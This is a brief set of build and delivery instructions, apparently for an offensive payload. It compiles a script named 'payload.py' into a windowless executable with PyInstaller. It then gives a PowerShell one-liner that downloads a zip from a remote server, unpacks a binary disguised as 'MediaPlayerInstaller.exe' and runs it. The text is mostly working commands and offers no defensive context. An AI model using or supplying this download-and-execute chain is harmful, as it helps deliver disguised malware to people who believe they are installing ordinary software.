Prerequisites (Install PyInstaller)
```bash
pip install pyinstaller requests
```

Compile the Script
```bash
pyinstaller --onefile --windowed payload.py
```

Example ps one-liner
```powershell
$ServerIP="10.0.0.1"; $Port=80; $ZipFile="MediaPlayerInstaller.zip"; $BinaryFile="MediaPlayerInstaller.exe"; $TargetDir="C:\Temp"; Invoke-WebRequest -Uri "http://$ServerIP:$Port/$ZipFile" -OutFile $ZipFile; Expand-Archive -Path $ZipFile -DestinationPath $TargetDir -Force; Start-Process -FilePath "$TargetDir\$BinaryFile"
```